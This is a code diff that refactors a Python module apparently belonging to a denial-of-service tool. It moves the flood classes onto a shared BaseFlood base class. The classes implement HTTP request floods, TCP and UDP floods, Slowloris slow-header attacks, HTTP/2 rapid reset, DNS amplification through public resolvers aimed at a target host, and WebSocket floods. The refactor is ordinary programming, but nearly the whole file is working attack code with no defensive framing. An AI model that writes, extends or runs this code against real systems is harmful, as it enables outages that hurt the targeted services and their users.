@@ -32,11 +32,10 @@ class BaseFlood:
         return (self.until - datetime.now()).total_seconds() <= 0
 
 
-class L7Async:
+class L7Async(BaseFlood):
     def __init__(self, endpoint, duration: int = 30):
-        self.endpoint = endpoint
+        super().__init__(endpoint, duration)
         self.net_tools: NetworkUtilities = NetworkUtilities()
-        self.until = datetime.now() + timedelta(seconds=duration)
         self._session: Optional[aiohttp.ClientSession] = None
 
     def _generate_data_content(self, length: int = 256) -> str:
@@ -50,7 +49,7 @@ class L7Async:
         return self._session
 
     async def _send_request(self, method: str) -> None:
-        while (self.until - datetime.now()).total_seconds() > 0:
+        while not self._is_expired():
             try:
                 session = await self._get_session()
                 url = f"{self.endpoint.scheme}://{self.endpoint.host}:{self.endpoint.port}{self.endpoint.path}"
@@ -82,7 +81,7 @@ class L7Async:
             except Exception:
                 logger.debug("L7 unexpected error")
 
-            if (self.until - datetime.now()).total_seconds() <= 0:
+            if self._is_expired():
                 break
             await asyncio.sleep(0.01)
 
@@ -91,30 +90,28 @@ class L7Async:
             await self._session.close()
 
     def GET(self) -> None:
-        asyncio.create_task(self._send_request("GET"))
+        self._run_async(self._send_request("GET"))
 
     def POST(self) -> None:
-        asyncio.create_task(self._send_request("POST"))
+        self._run_async(self._send_request("POST"))
 
     def PUT(self) -> None:
-        asyncio.create_task(self._send_request("PUT"))
+        self._run_async(self._send_request("PUT"))
 
     def DELETE(self) -> None:
-        asyncio.create_task(self._send_request("DELETE"))
+        self._run_async(self._send_request("DELETE"))
 
     def HEAD(self) -> None:
-        asyncio.create_task(self._send_request("HEAD"))
+        self._run_async(self._send_request("HEAD"))
 
 
-class L4Async:
+class L4Async(BaseFlood):
     def __init__(self, endpoint, duration: int):
-        self.endpoint = endpoint
+        super().__init__(endpoint, duration)
         self.net_tools: NetworkUtilities = NetworkUtilities()
-        self.until = datetime.now() + timedelta(seconds=duration)
-        self._tasks: List[asyncio.Task] = []
 
     async def _send_tcp_async(self, flags: str = None) -> None:
-        while (self.until - datetime.now()).total_seconds() > 0:
+        while not self._is_expired():
             try:
                 reader, writer = await asyncio.open_connection(
                     self.endpoint.host, self.endpoint.port
@@ -126,10 +123,6 @@ class L4Async:
                 await writer.wait_closed()
             except Exception:
                 logger.debug("L4 TCP send failed")
-
-    def _run_async(self, coro) -> None:
-        task = asyncio.create_task(coro)
-        self._tasks.append(task)
 
     def ACK(self) -> None:
         self._run_async(self._send_tcp_async("A"))
@@ -149,16 +142,11 @@ class L4Async:
     def UDP(self, message: bytes = b"hello") -> None:
         self._run_async(self._send_udp_async(message))
 
-    async def wait_done(self) -> None:
-        await asyncio.gather(*self._tasks, return_exceptions=True)
 
-
-class Slowloris:
+class Slowloris(BaseFlood):
     def __init__(self, endpoint, duration: int = 30):
-        self.endpoint = endpoint
+        super().__init__(endpoint, duration)
         self.net_tools: NetworkUtilities = NetworkUtilities()
-        self.until = datetime.now() + timedelta(seconds=duration)
-        self._tasks: List[asyncio.Task] = []
         self._sockets: List[socket.socket] = []
 
     def _generate_headers(self) -> bytes:
@@ -185,7 +173,7 @@ class Slowloris:
             headers = self._generate_headers()
             await asyncio.get_event_loop().sock_sendall(sock, headers)
 
-            while (self.until - datetime.now()).total_seconds() > 0:
+            while not self._is_expired():
                 try:
                     await asyncio.sleep(10)
                     partial = (
@@ -205,15 +193,11 @@ class Slowloris:
             except Exception:
                 logger.debug("Slowloris socket close error")
 
-    def _run_async(self, coro) -> None:
-        task = asyncio.create_task(coro)
-        self._tasks.append(task)
-
     def start(self) -> None:
         self._run_async(self._send_slowloris())
 
     async def wait_done(self) -> None:
-        await asyncio.gather(*self._tasks, return_exceptions=True)
+        await super().wait_done()
         for sock in self._sockets:
             try:
                 sock.close()
@@ -221,16 +205,14 @@ class Slowloris:
                 pass
 
 
-class H2RapidReset:
+class H2RapidReset(BaseFlood):
     def __init__(self, endpoint, duration: int = 30):
-        self.endpoint = endpoint
-        self.until = datetime.now() + timedelta(seconds=duration)
-        self._tasks: List[asyncio.Task] = []
+        super().__init__(endpoint, duration)
 
     async def _rapid_reset_raw(self) -> None:
         import ssl
 
-        while (self.until - datetime.now()).total_seconds() > 0:
+        while not self._is_expired():
             try:
                 ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ssl_ctx.check_hostname = False
@@ -275,23 +257,15 @@ class H2RapidReset:
             except Exception:
                 logger.debug("H2 reset error")
 
-    def _run_async(self, coro) -> None:
-        task = asyncio.create_task(coro)
-        self._tasks.append(task)
-
     def start(self) -> None:
         self._run_async(self._rapid_reset_raw())
 
-    async def wait_done(self) -> None:
-        await asyncio.gather(*self._tasks, return_exceptions=True)
 
-
-class DNSAmplification:
-    def __init__(self, target_host: str, target_port: int = 53, duration: int = 30):
-        self.target_host = target_host
-        self.target_port = target_port
-        self.until = datetime.now() + timedelta(seconds=duration)
-        self._tasks: List[asyncio.Task] = []
+class DNSAmplification(BaseFlood):
+    def __init__(self, endpoint, duration: int = 30):
+        super().__init__(endpoint, duration)
+        self.target_host = endpoint.host
+        self.target_port = endpoint.port
 
         self._resolvers = [
             ("8.8.8.8", 53),
@@ -306,7 +280,7 @@ class DNSAmplification:
         query_type = random.choice(["A", "AAAA", "MX", "TXT", "CNAME"])
         domain = f"{random.randint(1, 999999)}.example.com"
 
-        while (self.until - datetime.now()).total_seconds() > 0:
+        while not self._is_expired():
             try:
                 resolver_ip, resolver_port = random.choice(self._resolvers)
 
@@ -319,34 +293,25 @@ class DNSAmplification:
             except Exception:
                 logger.debug("DNS amp send failed")
 
-    def _run_async(self, coro) -> None:
-        task = asyncio.create_task(coro)
-        self._tasks.append(task)
-
     def start(self) -> None:
         self._run_async(self._send_dns_amp())
 
-    async def wait_done(self) -> None:
-        await asyncio.gather(*self._tasks, return_exceptions=True)
 
-
-class WebSocketFlood:
+class WebSocketFlood(BaseFlood):
     def __init__(self, endpoint, duration: int = 30):
-        self.endpoint = endpoint
+        super().__init__(endpoint, duration)
         self.net_tools: NetworkUtilities = NetworkUtilities()
-        self.until = datetime.now() + timedelta(seconds=duration)
-        self._tasks: List[asyncio.Task] = []
 
     async def _ws_flood(self) -> None:
         import aiohttp
 
-        while (self.until - datetime.now()).total_seconds() > 0:
+        while not self._is_expired():
             try:
                 ws_url = f"ws://{self.endpoint.host}:{self.endpoint.port}/ws"
                 async with aiohttp.ClientSession() as session:
                     async with session.ws_connect(ws_url, timeout=5) as ws:
                         for _ in range(10):
-                            if (self.until - datetime.now()).total_seconds() <= 0:
+                            if self._is_expired():
                                 break
                             msg = self.net_tools._generate_data_content(256)
                             await ws.send_str(msg)
@@ -354,15 +319,8 @@ class WebSocketFlood:
             except Exception:
                 logger.debug("WS flood error")
 
-    def _run_async(self, coro) -> None:
-        task = asyncio.create_task(coro)
-        self._tasks.append(task)
-
     def start(self) -> None:
         self._run_async(self._ws_flood())
-
-    async def wait_done(self) -> None:
-        await asyncio.gather(*self._tasks, return_exceptions=True)
 
 
 class MinecraftProtocol:
